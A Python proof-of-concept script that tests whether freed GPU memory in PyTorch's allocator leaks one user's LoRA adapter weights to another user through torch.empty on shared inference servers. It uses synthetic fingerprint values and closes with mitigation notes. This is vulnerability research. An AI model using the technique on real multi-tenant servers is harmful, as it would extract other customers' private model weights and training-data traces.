"""
Experiment 7: LoRA Adapter Switching — Weight & Activation Leak

Cloud GPU inference servers frequently serve multiple LoRA adapters on a single
base model. When a user's LoRA adapter is unloaded, its weight buffers are
freed to the PyTorch pool. The next user's adapter allocation gets those buffers
containing the previous adapter's proprietary weights.

Real-world impact:
  - LoRA adapters are often privately trained and commercially valuable
  - Adapter weights encode information about the private training dataset
  - A co-tenant user can extract another user's adapter weights via torch.empty

Scenario:
  User A: has a fine-tuned LoRA adapter (e.g., medical/legal domain)
  User B: loads a different LoRA adapter, gets User A's weights in their buffers
"""

import torch
import torch.nn as nn
import sys
import math


class LoRALayer(nn.Module):
    """Minimal LoRA decomposition: W + A @ B (rank-r)."""
    def __init__(self, in_dim, out_dim, rank=16, alpha=32.0):
        super().__init__()
        self.in_dim  = in_dim
        self.out_dim = out_dim
        self.rank    = rank
        self.scale   = alpha / rank
        self.A = nn.Parameter(torch.randn(rank, in_dim) * math.sqrt(2.0 / in_dim))
        self.B = nn.Parameter(torch.zeros(out_dim, rank))

    def forward(self, x):
        return (x @ self.A.T @ self.B.T) * self.scale


class LoRAAdapter(nn.Module):
    """A complete LoRA adapter with multiple layers."""
    def __init__(self, hidden_dim=4096, rank=64, n_layers=32):
        super().__init__()
        self.q_projs = nn.ModuleList([
            LoRALayer(hidden_dim, hidden_dim, rank) for _ in range(n_layers)
        ])
        self.v_projs = nn.ModuleList([
            LoRALayer(hidden_dim, hidden_dim, rank) for _ in range(n_layers)
        ])

    def total_params(self):
        return sum(p.numel() for p in self.parameters())


def make_fingerprinted_adapter(hidden_dim, rank, n_layers, fingerprint_val):
    """Create an adapter with weights initialized to a known pattern."""
    adapter = LoRAAdapter(hidden_dim, rank, n_layers)
    with torch.no_grad():
        for layer in adapter.q_projs:
            layer.A.fill_(fingerprint_val)
            layer.B.fill_(fingerprint_val * 0.1)
        for layer in adapter.v_projs:
            layer.A.fill_(fingerprint_val * 2.0)
            layer.B.fill_(fingerprint_val * 0.2)
    return adapter


def run():
    if not torch.cuda.is_available():
        print("CUDA not available"); sys.exit(1)

    print("=" * 62)
    print("LoRA Adapter Switching Memory Leak PoC")
    print(f"Device: {torch.cuda.get_device_name(0)}")
    print("=" * 62)

    # LoRA dimensions matching a realistic LLaMA-7B-like setup
    HIDDEN = 4096
    RANK   = 64
    LAYERS = 32

    print(f"\nAdapter config: hidden={HIDDEN}, rank={RANK}, layers={LAYERS}")

    # ------------------------------------------------------------------
    # Phase 1: User A's private LoRA adapter (e.g., medical fine-tune)
    # ------------------------------------------------------------------
    ADAPTER_A_FINGERPRINT = 0.271828   # recognizable weight value

    print(f"\n[1] User A: Loading private LoRA adapter (fingerprint={ADAPTER_A_FINGERPRINT})...")
    adapter_a = make_fingerprinted_adapter(HIDDEN, RANK, LAYERS, ADAPTER_A_FINGERPRINT)
    adapter_a = adapter_a.cuda().half()

    total_params = adapter_a.total_params()
    total_bytes  = total_params * 2  # fp16
    print(f"    Adapter size: {total_params:,} params ({total_bytes/1024/1024:.1f} MB)")

    # Capture fingerprint pointers and values
    q0_A_ptr  = adapter_a.q_projs[0].A.data_ptr()
    q0_A_vals = adapter_a.q_projs[0].A.cpu().float()[0, :4].tolist()
    print(f"    q_proj[0].A ptr    : 0x{q0_A_ptr:x}")
    print(f"    q_proj[0].A [0,:4] : {[f'{v:.6f}' for v in q0_A_vals]}")

    # User A runs inference (simulate activations)
    dummy_input = torch.randn(8, 512, HIDDEN, dtype=torch.float16, device="cuda")
    with torch.no_grad():
        _ = adapter_a.q_projs[0](dummy_input[:, 0, :])
    torch.cuda.synchronize()

    # ------------------------------------------------------------------
    # Phase 2: User A's adapter is unloaded (freed to pool)
    # ------------------------------------------------------------------
    print(f"\n[2] User A done — unloading LoRA adapter...")
    del adapter_a, dummy_input
    torch.cuda.synchronize()
    print(f"    Adapter freed to PyTorch pool (NOT zeroed)")

    # ------------------------------------------------------------------
    # Phase 3: User B loads a different LoRA adapter
    # ------------------------------------------------------------------
    ADAPTER_B_FINGERPRINT = 0.314159   # different adapter

    print(f"\n[3] User B: Loading their LoRA adapter (fingerprint={ADAPTER_B_FINGERPRINT})...")
    adapter_b = make_fingerprinted_adapter(HIDDEN, RANK, LAYERS, ADAPTER_B_FINGERPRINT)
    adapter_b = adapter_b.cuda().half()
    torch.cuda.synchronize()

    q0_B_ptr  = adapter_b.q_projs[0].A.data_ptr()
    q0_B_vals = adapter_b.q_projs[0].A.cpu().float()[0, :4].tolist()
    print(f"    q_proj[0].A ptr    : 0x{q0_B_ptr:x}")
    print(f"    q_proj[0].A [0,:4] : {[f'{v:.6f}' for v in q0_B_vals]}")

    # ------------------------------------------------------------------
    # Phase 4: Attacker allocates a torch.empty buffer the same size as
    # Adapter A's q_proj[0].A and checks for leaked weights
    # ------------------------------------------------------------------
    print(f"\n[4] Attacker: allocating empty buffer same size as q_proj.A...")
    SINGLE_A_SHAPE = (RANK, HIDDEN)
    leaked = torch.empty(SINGLE_A_SHAPE, dtype=torch.float16, device="cuda")
    torch.cuda.synchronize()
    leaked_ptr  = leaked.data_ptr()
    leaked_cpu  = leaked.cpu().float()

    print(f"    Leaked buffer ptr  : 0x{leaked_ptr:x}")
    print(f"    Same as Adapter A  : {leaked_ptr == q0_A_ptr}")
    print(f"    Leaked [0,:4]      : {[f'{v:.6f}' for v in leaked_cpu[0, :4].tolist()]}")

    # Check match against Adapter A's fingerprint
    expected_a_val = torch.tensor(ADAPTER_A_FINGERPRINT, dtype=torch.float32)
    matches_a = (leaked_cpu - ADAPTER_A_FINGERPRINT).abs() < 1e-3
    match_count = matches_a.sum().item()
    total = leaked_cpu.numel()
    nonzero = (leaked_cpu.abs() > 1e-4).sum().item()

    print(f"\n[5] Analysis:")
    print(f"    Buffer elements    : {total}")
    print(f"    Non-zero           : {nonzero} ({100.0*nonzero/total:.1f}%)")
    print(f"    Match Adapter A fp : {match_count} / {total} ({100.0*match_count/total:.1f}%)")

    if leaked_ptr == q0_A_ptr and match_count > total * 0.8:
        print(f"\n[!!!] FULL LEAK — User B's buffer contains User A's LoRA weights!")
        print(f"    Attacker recovered Adapter A fingerprint: {ADAPTER_A_FINGERPRINT}")
        print(f"    These weights encode User A's private fine-tuning data.")
    elif match_count > total * 0.5:
        print(f"\n[~] SIGNIFICANT LEAK — majority of Adapter A's weights visible")
    elif nonzero > total * 0.5:
        print(f"\n[~] Buffer contains non-zero data from prior adapter (not Adapter A)")
        print(f"    Pool residue still present from previous operations")
    else:
        print(f"\n[=] Allocator returned a fresh/clean block for this call")

    # Mitigation
    print(f"\n[6] Mitigation — load adapter with explicit weight init (no empty):")
    print(f"    Standard adapter loading always writes weights from CPU")
    print(f"    → weights overwrite pool data → SAFE (initialization is the fix)")
    print(f"    Vulnerability: any torch.empty used for INTERMEDIATE buffers")
    print(f"    during adapter inference (activations, attention, etc.)")

    del leaked, adapter_b
    print("\n[Done]")


if __name__ == "__main__":
    run()
